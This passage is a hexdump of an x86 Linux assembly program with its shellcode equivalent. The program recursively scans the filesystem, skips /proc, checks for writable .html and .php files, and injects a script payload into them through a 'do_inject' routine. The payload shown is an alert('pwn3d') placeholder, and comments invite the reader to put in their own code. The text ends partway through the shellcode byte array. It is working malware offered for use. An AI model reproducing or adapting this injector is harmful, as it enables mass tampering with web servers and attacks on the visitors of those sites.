00001470  6f 76 20 65 62 78 2c 20  65 73 70 0d 0a 20 20 20  |ov ebx, esp..   |
00001480  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00001490  20 61 6c 2c 20 31 32 0d  0a 20 20 20 20 20 20 20  | al, 12..       |
000014a0  20 20 20 20 20 20 20 20  20 69 6e 74 20 30 78 38  |         int 0x8|
000014b0  30 0d 0a 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |0....           |
000014c0  20 20 20 20 20 6c 65 61  76 65 20 0d 0a 20 20 20  |     leave ..   |
000014d0  20 20 20 20 20 20 20 20  20 20 20 20 20 72 65 74  |             ret|
000014e0  0d 0a 0d 0a 2e 6c 31 3a  0d 0a 20 20 20 20 20 20  |.....l1:..      |
000014f0  20 20 20 20 20 20 20 20  20 20 6c 65 61 20 65 64  |          lea ed|
00001500  78 2c 20 5b 65 73 70 20  2b 20 31 31 30 5d 0d 0a  |x, [esp + 110]..|
00001510  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001520  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001530  20 20 63 6d 70 20 44 57  4f 52 44 20 5b 65 64 78  |  cmp DWORD [edx|
00001540  5d 2c 20 30 78 36 33 36  66 37 32 37 30 20 20 20  |], 0x636f7270   |
00001550  3b 20 49 66 20 74 68 65  20 2f 70 72 6f 63 20 66  |; If the /proc f|
00001560  69 6c 65 73 79 73 74 65  6d 20 64 65 74 65 63 74  |ilesystem detect|
00001570  65 64 2e 2e 2e 0d 0a 20  20 20 20 20 20 20 20 20  |ed.....         |
00001580  20 20 20 20 20 20 20 6a  65 20 2e 77 68 69 6c 65  |       je .while|
00001590  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000015a0  20 20 20 20 20 3b 20 2e  2e 2e 6e 65 78 74 20 64  |     ; ...next d|
000015b0  69 72 0d 0a 20 20 20 20  20 20 20 20 20 0d 0a 20  |ir..         .. |
000015c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 63  |               c|
000015d0  6d 70 20 42 59 54 45 20  5b 65 64 78 5d 2c 20 30  |mp BYTE [edx], 0|
000015e0  78 32 65 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |x2e..           |
000015f0  20 20 20 20 20 6a 6e 65  20 2e 6c 32 0d 0a 20 20  |     jne .l2..  |
00001600  20 20 20 20 20 20 20 20  20 20 20 20 20 20 0d 0a  |              ..|
00001610  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001620  6a 6d 70 20 20 2e 77 68  69 6c 65 0d 0a 0d 0a 2e  |jmp  .while.....|
00001630  6c 32 3a 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |l2:..           |
00001640  20 20 20 3b 20 6c 73 74  61 74 28 63 6f 6e 73 74  |   ; lstat(const|
00001650  20 63 68 61 72 20 2a 66  69 6c 65 2c 20 73 74 72  | char *file, str|
00001660  75 63 74 20 73 74 61 74  20 2a 62 75 66 29 0d 0a  |uct stat *buf)..|
00001670  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001680  6d 6f 76 20 65 62 78 2c  20 65 64 78 0d 0a 20 20  |mov ebx, edx..  |
00001690  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
000016a0  76 20 65 63 78 2c 20 65  73 70 0d 0a 20 20 20 20  |v ecx, esp..    |
000016b0  20 20 20 20 20 20 20 20  20 20 20 20 78 6f 72 20  |            xor |
000016c0  65 61 78 2c 20 65 61 78  0d 0a 20 20 20 20 20 20  |eax, eax..      |
000016d0  20 20 20 20 20 20 20 20  20 20 6d 6f 76 20 61 6c  |          mov al|
000016e0  2c 20 31 39 36 0d 0a 20  20 20 20 20 20 20 20 20  |, 196..         |
000016f0  20 20 20 20 20 20 20 69  6e 74 20 30 78 38 30 20  |       int 0x80 |
00001700  0d 0a 20 20 20 20 20 20  20 20 20 0d 0a 20 20 20  |..         ..   |
00001710  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00001720  20 63 78 2c 20 36 31 34  33 39 0d 0a 20 20 20 20  | cx, 61439..    |
00001730  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
00001740  62 78 2c 20 34 30 39 35  39 0d 0a 20 20 20 20 20  |bx, 40959..     |
00001750  20 20 20 20 20 20 20 20  20 20 20 69 6e 63 20 65  |           inc e|
00001760  63 78 20 20 20 0d 0a 20  20 20 20 20 20 20 20 20  |cx   ..         |
00001770  20 20 20 20 20 20 20 69  6e 63 20 65 62 78 0d 0a  |       inc ebx..|
00001780  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001790  6d 6f 76 20 65 61 78 2c  20 5b 65 73 70 20 2b 20  |mov eax, [esp + |
000017a0  31 36 5d 0d 0a 20 20 20  20 20 20 20 20 20 0d 0a  |16]..         ..|
000017b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000017c0  61 6e 64 20 61 78 2c 20  63 78 0d 0a 20 20 20 20  |and ax, cx..    |
000017d0  20 20 20 20 20 0d 0a 20  20 20 20 20 20 20 20 20  |     ..         |
000017e0  20 20 20 20 20 20 20 63  6d 70 20 61 78 2c 20 62  |       cmp ax, b|
000017f0  78 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |x..             |
00001800  20 20 20 6a 6e 65 20 2e  6c 33 0d 0a 20 20 20 20  |   jne .l3..    |
00001810  20 20 20 20 20 20 20 20  20 20 20 20 0d 0a 20 20  |            ..  |
00001820  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6a 6d  |              jm|
00001830  70 20 2e 77 68 69 6c 65  0d 0a 0d 0a 2e 6c 33 3a  |p .while.....l3:|
00001840  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001850  20 20 78 6f 72 20 65 61  78 2c 20 65 61 78 0d 0a  |  xor eax, eax..|
00001860  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001870  70 75 73 68 20 65 61 78  0d 0a 20 20 20 20 20 20  |push eax..      |
00001880  20 20 20 20 20 20 20 20  20 20 73 75 62 20 65 73  |          sub es|
00001890  70 2c 20 42 59 54 45 20  30 78 31 0d 0a 20 20 20  |p, BYTE 0x1..   |
000018a0  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
000018b0  20 42 59 54 45 20 5b 65  73 70 5d 2c 20 30 78 32  | BYTE [esp], 0x2|
000018c0  65 0d 0a 20 20 20 20 20  20 20 20 20 0d 0a 20 20  |e..         ..  |
000018d0  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 63 68  |            ; ch|
000018e0  64 69 72 28 22 66 69 6c  65 22 29 0d 0a 20 20 20  |dir("file")..   |
000018f0  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00001900  20 65 62 78 2c 20 65 64  78 0d 0a 20 20 20 20 20  | ebx, edx..     |
00001910  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 61  |           mov a|
00001920  6c 2c 20 31 32 0d 0a 20  20 20 20 20 20 20 20 20  |l, 12..         |
00001930  20 20 20 20 20 20 20 69  6e 74 20 30 78 38 30 0d  |       int 0x80.|
00001940  0a 20 20 20 20 20 20 20  20 20 0d 0a 20 20 20 20  |.         ..    |
00001950  20 20 20 20 20 20 20 20  20 20 20 20 74 65 73 74  |            test|
00001960  20 65 61 78 2c 20 65 61  78 0d 0a 20 20 20 20 20  | eax, eax..     |
00001970  20 20 20 20 20 20 20 20  20 20 20 6a 6e 65 20 2e  |           jne .|
00001980  6c 34 0d 0a 20 20 20 20  20 20 20 20 20 0d 0a 20  |l4..         .. |
00001990  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 63  |               c|
000019a0  61 6c 6c 20 73 65 61 72  63 68 0d 0a 20 20 20 20  |all search..    |
000019b0  20 20 20 20 20 20 20 20  20 20 20 20 0d 0a 20 20  |            ..  |
000019c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6a 6d  |              jm|
000019d0  70 20 2e 77 68 69 6c 65  0d 0a 0d 0a 2e 6c 34 3a  |p .while.....l4:|
000019e0  20 20 20 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |   ..           |
000019f0  20 20 20 3b 20 61 63 63  65 73 73 28 22 66 69 6c  |   ; access("fil|
00001a00  65 22 2c 20 57 5f 4f 4b  29 20 20 20 20 20 20 20  |e", W_OK)       |
00001a10  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001a20  20 20 78 6f 72 20 65 61  78 2c 20 65 61 78 0d 0a  |  xor eax, eax..|
00001a30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001a40  6d 6f 76 20 65 62 78 2c  20 65 64 78 0d 0a 20 20  |mov ebx, edx..  |
00001a50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 78 6f  |              xo|
00001a60  72 20 65 63 78 2c 20 65  63 78 0d 0a 20 20 20 20  |r ecx, ecx..    |
00001a70  20 20 20 20 20 20 20 20  20 20 20 20 6d 6f 76 20  |            mov |
00001a80  63 6c 2c 20 32 0d 0a 20  20 20 20 20 20 20 20 20  |cl, 2..         |
00001a90  20 20 20 20 20 20 20 6d  6f 76 20 61 6c 2c 20 33  |       mov al, 3|
00001aa0  33 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |3..             |
00001ab0  20 20 20 69 6e 74 20 30  78 38 30 0d 0a 20 20 20  |   int 0x80..   |
00001ac0  20 20 20 20 20 20 0d 0a  20 20 20 20 20 20 20 0d  |      ..       .|
00001ad0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00001ae0  20 74 65 73 74 20 65 61  78 2c 20 65 61 78 0d 0a  | test eax, eax..|
00001af0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001b00  6a 7a 20 2e 63 68 65 63  6b 5f 68 74 6d 6c 0d 0a  |jz .check_html..|
00001b10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001b20  0d 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |..              |
00001b30  20 20 6a 6d 70 20 2e 77  68 69 6c 65 0d 0a 0d 0a  |  jmp .while....|
00001b40  3b 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |;===============|
00001b50  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00001b80  3d 3d 3d 3d 3d 3d 3d 3b  0d 0a 3b 20 20 20 20 20  |=======;..;     |
00001b90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001ba0  20 20 20 20 20 20 20 20  20 20 63 68 65 63 6b 5f  |          check_|
00001bb0  68 74 6d 6c 20 20 20 20  20 20 20 20 20 20 20 20  |html            |
00001bc0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001bd0  20 3b 0d 0a 3b 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  | ;..;===========|
00001be0  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00001c10  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3b 0d 0a 2e 63  |===========;...c|
00001c20  68 65 63 6b 5f 68 74 6d  6c 3a 0d 0a 20 20 20 20  |heck_html:..    |
00001c30  20 20 20 20 20 20 20 20  20 20 20 20 78 6f 72 20  |            xor |
00001c40  65 61 78 2c 20 65 61 78  0d 0a 20 20 20 20 20 20  |eax, eax..      |
00001c50  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 65  |          push e|
00001c60  61 78 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |ax..            |
00001c70  20 20 20 20 70 75 73 68  20 44 57 4f 52 44 20 30  |    push DWORD 0|
00001c80  78 36 63 36 64 37 34 36  38 20 20 20 3b 20 0d 0a  |x6c6d7468   ; ..|
00001c90  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001ca0  73 75 62 20 65 73 70 2c  20 42 59 54 45 20 30 78  |sub esp, BYTE 0x|
00001cb0  31 20 20 20 20 20 20 20  3b 20 2e 68 74 6d 6c 0d  |1       ; .html.|
00001cc0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00001cd0  20 6d 6f 76 20 42 59 54  45 20 5b 65 73 70 5d 2c  | mov BYTE [esp],|
00001ce0  20 30 78 32 65 20 20 20  20 3b 20 20 0d 0a 20 20  | 0x2e    ;  ..  |
00001cf0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 0d 0a  |              ..|
00001d00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001d10  6d 6f 76 20 65 73 69 2c  20 65 73 70 20 20 20 20  |mov esi, esp    |
00001d20  20 20 20 20 20 0d 0a 20  20 20 20 20 20 20 20 20  |     ..         |
00001d30  20 20 20 20 20 20 20 6d  6f 76 20 65 64 69 2c 20  |       mov edi, |
00001d40  65 64 78 20 20 20 20 20  20 20 20 20 0d 0a 20 20  |edx         ..  |
00001d50  20 20 20 20 20 20 20 20  20 20 20 20 20 20 63 61  |              ca|
00001d60  6c 6c 20 73 75 62 73 74  72 0d 0a 20 20 20 20 20  |ll substr..     |
00001d70  20 20 20 20 0d 0a 20 20  20 20 20 20 20 20 20 20  |    ..          |
00001d80  20 20 20 20 20 20 63 6d  70 20 42 59 54 45 20 61  |      cmp BYTE a|
00001d90  6c 2c 20 32 0d 0a 20 20  20 20 20 20 20 20 20 20  |l, 2..          |
00001da0  20 20 20 20 20 20 6a 65  20 2e 64 6f 5f 69 6e 6a  |      je .do_inj|
00001db0  65 63 74 0d 0a 0d 0a 3b  3d 3d 3d 3d 3d 3d 3d 3d  |ect....;========|
00001dc0  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00001df0  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3b 0d  |==============;.|
00001e00  0a 3b 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.;              |
00001e10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001e20  20 63 68 65 63 6b 5f 70  68 70 20 20 20 20 20 20  | check_php      |
00001e30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001e40  20 20 20 20 20 20 20 20  3b 0d 0a 3b 3d 3d 3d 3d  |        ;..;====|
00001e50  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00001e90  3d 3d 3b 20 20 20 20 20  20 20 20 20 20 20 20 20  |==;             |
00001ea0  20 20 0d 0a 2e 63 68 65  63 6b 5f 70 68 70 3a 20  |  ...check_php: |
00001eb0  20 20 20 20 0d 0a 20 20  20 20 20 20 20 20 20 20  |    ..          |
00001ec0  20 20 20 20 20 20 78 6f  72 20 65 61 78 2c 20 65  |      xor eax, e|
00001ed0  61 78 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |ax..            |
00001ee0  20 20 20 20 70 75 73 68  20 65 61 78 0d 0a 20 20  |    push eax..  |
00001ef0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
00001f00  73 68 20 44 57 4f 52 44  20 30 78 37 30 36 38 37  |sh DWORD 0x70687|
00001f10  30 32 65 20 20 20 3b 20  2e 70 68 70 0d 0a 20 20  |02e   ; .php..  |
00001f20  20 20 20 20 20 20 20 20  20 20 20 20 20 0d 0a 20  |             .. |
00001f30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 6d  |               m|
00001f40  6f 76 20 65 73 69 2c 20  65 73 70 20 20 20 20 20  |ov esi, esp     |
00001f50  20 20 20 20 0d 0a 20 20  20 20 20 20 20 20 20 20  |    ..          |
00001f60  20 20 20 20 20 20 0d 0a  20 20 20 20 20 20 20 20  |      ..        |
00001f70  20 20 20 20 20 20 20 20  63 61 6c 6c 20 73 75 62  |        call sub|
00001f80  73 74 72 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |str..           |
00001f90  20 20 20 20 20 0d 0a 20  20 20 20 20 20 20 20 20  |     ..         |
00001fa0  20 20 20 20 20 20 20 63  6d 70 20 42 59 54 45 20  |       cmp BYTE |
00001fb0  61 6c 2c 20 32 0d 0a 20  20 20 20 20 20 20 20 20  |al, 2..         |
00001fc0  20 20 20 20 20 20 20 6a  65 20 2e 64 6f 5f 69 6e  |       je .do_in|
00001fd0  6a 65 63 74 0d 0a 20 20  20 20 20 20 20 20 20 20  |ject..          |
00001fe0  20 20 20 20 20 20 0d 0a  20 20 20 20 20 20 20 20  |      ..        |
00001ff0  20 20 20 20 20 20 20 20  6a 6d 70 20 2e 77 68 69  |        jmp .whi|
00002000  6c 65 20 0d 0a 0d 0a 3b  3d 3d 3d 3d 3d 3d 3d 3d  |le ....;========|
00002010  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00002040  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3b 0d  |==============;.|
00002050  0a 3b 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.;              |
00002060  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002070  20 64 6f 5f 69 6e 6a 65  63 74 20 20 20 20 20 20  | do_inject      |
00002080  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002090  20 20 20 20 20 20 20 20  3b 0d 0a 3b 3d 3d 3d 3d  |        ;..;====|
000020a0  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
000020e0  3d 3d 3b 0d 0a 2e 64 6f  5f 69 6e 6a 65 63 74 3a  |==;...do_inject:|
000020f0  20 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  | ..             |
00002100  20 20 20 6a 6d 70 20 53  48 4f 52 54 20 2e 79 6f  |   jmp SHORT .yo|
00002110  75 72 5f 63 6f 64 65 0d  0a 20 20 20 20 20 20 20  |ur_code..       |
00002120  20 20 20 20 20 20 20 20  20 0d 0a 2e 77 72 69 74  |         ...writ|
00002130  65 3a 20 20 0d 0a 20 20  20 20 20 20 20 20 20 20  |e:  ..          |
00002140  20 20 20 20 20 20 70 6f  70 20 20 65 73 69 20 20  |      pop  esi  |
00002150  20 20 3b 20 47 65 74 20  74 68 65 20 61 64 64 72  |  ; Get the addr|
00002160  65 73 73 20 6f 66 20 79  6f 75 72 20 63 6f 64 65  |ess of your code|
00002170  20 69 6e 74 6f 20 65 73  69 0d 0a 20 20 20 20 20  | into esi..     |
00002180  20 20 20 20 20 20 20 20  20 20 20 0d 0a 20 20 20  |           ..   |
00002190  20 20 20 20 20 20 20 20  20 20 20 20 20 63 61 6c  |             cal|
000021a0  6c 20 69 6e 6a 65 63 74  0d 0a 20 20 20 20 20 20  |l inject..      |
000021b0  20 20 20 20 20 20 20 20  20 20 0d 0a 20 20 20 20  |          ..    |
000021c0  20 20 20 20 20 20 20 20  20 20 20 20 6a 6d 70 20  |            jmp |
000021d0  2e 77 68 69 6c 65 0d 0a  0d 0a 3b 3d 3d 3d 3d 3d  |.while....;=====|
000021e0  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00002220  3d 3b 20 20 0d 0a 3b 20  20 20 20 20 20 20 20 20  |=;  ..;         |
00002230  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002240  20 20 20 20 20 20 79 6f  75 72 5f 63 6f 64 65 20  |      your_code |
00002250  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002260  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 0d 0a  |             ;..|
00002270  3b 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |;===============|
00002280  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
000022b0  3d 3d 3d 3d 3d 3d 3d 3b  0d 0a 20 2e 79 6f 75 72  |=======;.. .your|
000022c0  5f 63 6f 64 65 3a 0d 0a  20 20 20 20 20 20 20 20  |_code:..        |
000022d0  20 20 20 20 20 20 20 63  61 6c 6c 20 2e 77 72 69  |       call .wri|
000022e0  74 65 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |te..            |
000022f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00002340  20 20 0d 0a 3b 20 48 65  72 65 20 61 20 70 6c 61  |  ..; Here a pla|
00002350  63 65 20 66 6f 72 20 79  6f 75 72 20 63 6f 64 65  |ce for your code|
00002360  2e 20 49 74 73 20 73 69  7a 65 20 73 68 6f 75 6c  |. Its size shoul|
00002370  64 20 62 65 20 61 6c 6c  6f 63 61 74 65 64 20 69  |d be allocated i|
00002380  6e 20 74 68 65 0d 0a 3b  20 72 65 67 69 73 74 65  |n the..; registe|
00002390  72 20 64 6c 2e 20 4c 6f  6f 6b 20 61 74 20 74 68  |r dl. Look at th|
000023a0  65 20 22 69 6e 6a 65 63  74 22 20 66 75 6e 63 74  |e "inject" funct|
000023b0  69 6f 6e 2e 20 20 20 20  20 20 20 20 20 20 20 20  |ion.            |
000023c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
000023f0  20 20 20 0d 0a 20 20 20  20 20 20 20 20 20 20 20  |   ..           |
00002400  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00002450  20 20 20 20 0d 0a 64 62  20 27 3c 68 74 6d 6c 3e  |    ..db '<html>|
00002460  3c 73 63 72 69 70 74 3e  61 6c 65 72 74 28 22 70  |<script>alert("p|
00002470  77 6e 33 64 22 29 3c 73  63 72 69 70 74 3e 3c 2f  |wn3d")<script></|
00002480  68 74 6d 6c 3e 27 20 3b  3c 2d 20 59 6f 75 20 63  |html>' ;<- You c|
00002490  61 6e 20 63 68 61 6e 67  65 20 69 74 2e 0d 0a 0d  |an change it....|
000024a0  0a 3b 20 44 6f 6e 74 27  74 20 66 6f 72 67 65 74  |.; Dont't forget|
000024b0  20 74 6f 20 63 68 61 6e  67 65 20 74 68 65 20 73  | to change the s|
000024c0  69 7a 65 20 6f 66 20 79  6f 75 72 20 63 6f 64 65  |ize of your code|
000024d0  21 0d 0a 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |!..-------------|
000024e0  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |----------------|
*
00002510  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 20 0d 0a 20 20  |----------- ..  |
00002520  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00002530  20 20 20 20 20 20 20 0d  0a 20 20 20 20 20 20 20  |       ..       |
00002540  20 20 20 20 20 20 0d 0a  20 20 20 20 20 20 20 20  |      ..        |
00002550  20 20 20 20 20 20 42 65  6c 6f 77 20 69 73 20 70  |      Below is p|
00002560  72 65 73 65 6e 74 65 64  20 74 68 65 20 73 68 65  |resented the she|
00002570  6c 6c 63 6f 64 65 20 65  71 75 69 76 61 6c 65 6e  |llcode equivalen|
00002580  74 2e 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  |t...            |
00002590  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000025a0  20 20 0d 0a 0d 0a 23 69  6e 63 6c 75 64 65 20 3c  |  ....#include <|
000025b0  73 74 64 69 6f 2e 68 3e  0d 0a 0d 0a 63 68 61 72  |stdio.h>....char|
000025c0  20 73 68 65 6c 6c 63 6f  64 65 5b 5d 20 3d 20 0d  | shellcode[] = .|
000025d0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
000025e0  20 20 20 20 20 20 20 20  20 20 20 20 20 0d 0a 20  |             .. |
000025f0  20 20 20 22 5c 78 33 31  5c 78 63 30 5c 78 35 30  |   "\x31\xc0\x50|
00002600  5c 78 38 33 5c 78 65 63  5c 78 30 31 5c 78 63 36  |\x83\xec\x01\xc6|
00002610  5c 78 30 34 5c 78 32 34  5c 78 32 66 5c 78 38 39  |\x04\x24\x2f\x89|
00002620  5c 78 65 33 5c 78 62 30  5c 78 30 63 5c 78 63 64  |\xe3\xb0\x0c\xcd|
00002630  5c 78 38 30 22 0d 0a 20  20 20 20 22 5c 78 33 31  |\x80"..    "\x31|
00002640  5c 78 63 30 5c 78 35 30  5c 78 38 33 5c 78 65 63  |\xc0\x50\x83\xec|
00002650  5c 78 30 31 5c 78 63 36  5c 78 30 34 5c 78 32 34  |\x01\xc6\x04\x24|
00002660  5c 78 32 65 5c 78 65 62  5c 78 30 32 5c 78 65 62  |\x2e\xeb\x02\xeb|
00002670  5c 78 36 33 5c 78 65 38  5c 78 66 39 22 0d 0a 20  |\x63\xe8\xf9".. |
00002680  20 20 20 22 5c 78 66 66  5c 78 66 66 5c 78 66 66  |   "\xff\xff\xff|
00002690  5c 78 33 31 5c 78 63 30  5c 78 33 31 5c 78 64 62  |\x31\xc0\x31\xdb|
000026a0  5c 78 62 30 5c 78 30 31  5c 78 63 64 5c 78 38 30  |\xb0\x01\xcd\x80|
000026b0  5c 78 33 31 5c 78 63 30  5c 78 38 39 5c 78 66 62  |\x31\xc0\x89\xfb|
000026c0  5c 78 33 31 22 0d 0a 20  20 20 20 22 5c 78 63 39  |\x31"..    "\xc9|
000026d0  5c 78 62 31 5c 78 30 32  5c 78 62 30 5c 78 30 35  |\xb1\x02\xb0\x05|
000026e0  5c 78 63 64 5c 78 38 30  5c 78 33 31 5c 78 64 62  |\xcd\x80\x31\xdb|
000026f0  5c 78 38 39 5c 78 63 33  5c 78 33 31 5c 78 63 39  |\x89\xc3\x31\xc9|
00002700  5c 78 33 31 5c 78 63 30  5c 78 39 39 22 0d 0a 20  |\x31\xc0\x99".. |
00002710  20 20 20 22 5c 78 62 32  5c 78 30 32 5c 78 62 30  |   "\xb2\x02\xb0|
00002720  5c 78 31 33 5c 78 63 64  5c 78 38 30 5c 78 33 31  |\x13\xcd\x80\x31|
00002730  5c 78 63 30 5c 78 38 39  5c 78 66 31 5c 78 62 32  |\xc0\x89\xf1\xb2|
00002740  5c 78 32 62 5c 78 62 30  5c 78 30 34 5c 78 63 64  |\x2b\xb0\x04\xcd|
00002750  5c 78 38 30 22 20 0d 0a  20 20 20 20 22 5c 78 33  |\x80" ..    "\x3|
00002760  31 5c 78 63 30 5c 78 62  30 5c 78 30 36 5c 78 63  |1\xc0\xb0\x06\xc|
00002770  64 5c 78 38 30 5c 78 63  33 5c 78 33 31 5c 78 63  |d\x80\xc3\x31\xc|
00002780  30 5c 78 33 31 5c 78 64  62 5c 78 33 31 5c 78 63  |0\x31\xdb\x31\xc|
00002790  39 5c 78 39 39 5c 78 34  32 5c 78 38 61 22 0d 0a  |9\x99\x42\x8a"..|
000027a0  20 20 20 20 22 5c 78 31  63 5c 78 31 37 5c 78 38  |    "\x1c\x17\x8|
000027b0  34 5c 78 64 62 5c 78 37  34 5c 78 31 61 5c 78 33  |4\xdb\x74\x1a\x3|
000027c0  61 5c 78 31 65 5c 78 37  35 5c 78 66 34 5c 78 38  |a\x1e\x75\xf4\x8|
000027d0  61 5c 78 30 34 5c 78 30  65 5c 78 38 61 5c 78 31  |a\x04\x0e\x8a\x1|
000027e0  63 5c 78 31 37 22 0d 0a  20 20 20 20 22 5c 78 38  |c\x17"..    "\x8|
000027f0  34 5c 78 63 30 5c 78 37  34 5c 78 30 38 5c 78 34  |4\xc0\x74\x08\x4|
00002800  31 5c 78 34 32 5c 78 33  38 5c 78 63 33 5c 78 37  |1\x42\x38\xc3\x7|
00002810  34 5c 78 66 30 5c 78 65  62 5c 78 30 34 5c 78 33  |4\xf0\xeb\x04\x3|
00002820  31 5c 78 63 30 5c 78 62  30 5c 78 30 32 22 0d 0a  |1\xc0\xb0\x02"..|
00002830  20 20 20 20 22 5c 78 63  33 5c 78 35 35 5c 78 38  |    "\xc3\x55\x8|
00002840  39 5c 78 65 35 5c 78 62  30 5c 78 66 61 5c 78 32  |9\xe5\xb0\xfa\x2|
00002850  39 5c 78 63 34 5c 78 33  31 5c 78 63 30 5c 78 33  |9\xc4\x31\xc0\x3|
00002860  31 5c 78 63 39 5c 78 38  64 5c 78 35 64 5c 78 30  |1\xc9\x8d\x5d\x0|
00002870  38 5c 78 62 30 22 0d 0a  20 20 20 20 22 5c 78 30  |8\xb0"..    "\x0|
00002880  35 5c 78 63 64 5c 78 38  30 5c 78 38 35 5c 78 63  |5\xcd\x80\x85\xc|
00002890  30 5c 78 37 38 5c 78 32  32 5c 78 38 39 5c 78 34  |0\x78\x22\x89\x4|
000028a0  35 5c 78 30 63 5c 78 38  62 5c 78 37 35 5c 78 30  |5\x0c\x8b\x75\x0|
000028b0  63 5c 78 38 39 5c 78 66  33 5c 78 33 31 22 0d 0a  |c\x89\xf3\x31"..|
000028c0  20 20 20 20 22 5c 78 63  30 5c 78 33 31 5c 78 63  |    "\xc0\x31\xc|
000028d0  39 5c 78 38 64 5c 78 34  63 5c 78 32 34 5c 78 36  |9\x8d\x4c\x24\x6|
000028e0  34 5c 78 62 30 5c 78 35  39 5c 78 63 64 5c 78 38  |4\xb0\x59\xcd\x8|
000028f0  30 5c 78 38 35 5c 78 63  30 5c 78 37 35 5c 78 31  |0\x85\xc0\x75\x1|
00002900  39 5c 78 33 31 22 0d 0a  20 20 20 20 22 5c 78 63  |9\x31"..    "\xc|
